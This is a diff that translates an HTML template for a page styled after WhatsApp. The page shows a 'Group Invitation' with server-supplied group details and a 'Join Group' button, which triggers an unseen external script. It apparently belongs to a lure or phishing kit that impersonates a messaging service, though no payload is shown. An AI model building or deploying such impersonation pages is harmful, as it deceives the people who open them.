@@ -1,14 +1,14 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>انضمام للمجموعة</title>
+    <title>Group Invitation</title>
+
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     
     <style>
-        /* CSS يوضع هنا */
         :root {
             --whatsapp-green: #008069; 
             --whatsapp-light-green: #25D366;
@@ -58,9 +58,9 @@
 
         .header .material-icons {
             font-size: 24px;
-            margin-left: 15px;
+            margin-right: 15px;
             cursor: pointer;
-            visibility: hidden; /* إخفاء زر الرجوع */
+            visibility: hidden;
         }
         
         .header .title {
@@ -129,8 +129,8 @@
         }
         
         .action-button.success {
-            background-color: #4CAF50 !important; /* لون نجاح */
-            pointer-events: none; /* تعطيل الضغط بعد النجاح */
+            background-color: #4CAF50 !important;
+            pointer-events: none;
         }
 
         .action-button:active:not(:disabled) {
@@ -190,7 +190,6 @@
             z-index: -1;
         }
 
-        /* Responsive Design for Mobile */
         @media (max-width: 480px) {
             body {
                 padding: 0; 
@@ -215,27 +214,28 @@
     <div class="container">
         <div class="header">
             <span class="material-icons">arrow_back</span>
-            <span class="title">دعوة المجموعة</span>
+            <span class="title">Group Invitation</span>
         </div>
 
         <div class="group-details">
-            <img id="groupImage" class="group-image" src="" alt="صورة المجموعة" style="display: none;">
+            <img id="groupImage" class="group-image" src="" alt="Group Image" style="display: none;">
             
-            <div id="defaultIcon" class="group-image default-icon" style="display: block;"><span class="material-icons" style="font-size: 70px;">group</span></div>
+            <div id="defaultIcon" class="group-image default-icon" style="display: block;">
+                <span class="material-icons" style="font-size: 70px;">group</span>
+            </div>
 
-            <h2 id="groupName" class="group-name">...جاري التحميل</h2>
-            
-            <p id="groupMembers" class="member-count">0 عضو</p>
+            <h2 id="groupName" class="group-name">Loading...</h2>
+            <p id="groupMembers" class="member-count">0 members</p>
         </div>
 
         <div class="join-section">
-            <h3 style="color: var(--text-color); font-weight: 500; margin-bottom: 5px;">دعوة للانضمام إلى:</h3>
+            <h3 style="color: var(--text-color); font-weight: 500; margin-bottom: 5px;">Invitation to join:</h3>
             <p id="groupNameSmall" style="color: var(--whatsapp-green); font-size: 16px; font-weight: 500; margin-bottom: 20px;"></p>
 
-            <p id="statusMessage" class="status-message">انقر على "الانضمام للمجموعة" للمتابعة.</p>
+            <p id="statusMessage" class="status-message">Click "Join Group" to continue.</p>
             
             <button id="actionButton" class="action-button" onclick="startSequence()">
-                الانضمام للمجموعة
+                Join Group
                 <span id="loadingSpinner" class="spinner"></span>
             </button>
         </div>
@@ -246,7 +246,6 @@
     <script src="{{ url_for('static', filename='script.js') }}"></script>
 
     <script>
-        // المتغيرات التي سيستخدمها script.js
         let config = {}; 
 
         document.addEventListener('DOMContentLoaded', function() {
@@ -256,11 +255,11 @@
         async function fetchConfig() {
             try {
                 const response = await fetch('/get_config');
-                config = await response.json(); // حفظ الإعدادات في المتغير config
+                config = await response.json();
 
                 document.getElementById('groupName').textContent = config.group_name;
                 document.getElementById('groupNameSmall').textContent = config.group_name;
-                document.getElementById('groupMembers').textContent = `${config.group_members.toLocaleString('en-US')} أعضاء`;
+                document.getElementById('groupMembers').textContent = `${config.group_members.toLocaleString('en-US')} members`;
 
                 const groupImageElement = document.getElementById('groupImage');
                 const defaultIconElement = document.getElementById('defaultIcon');
@@ -279,12 +278,12 @@
                      statusMessageElement.textContent = config.spam_message;
                      statusMessageElement.classList.add('spam');
                 } else {
-                     statusMessageElement.textContent = "انضم إلينا في هذه المجموعة!";
+                     statusMessageElement.textContent = "Join our group!";
                 }
 
             } catch (error) {
                 console.error('Error fetching configuration:', error);
-                document.getElementById('groupName').textContent = 'تعذر تحميل بيانات المجموعة';
+                document.getElementById('groupName').textContent = 'Failed to load group data';
             }
         }
     </script>
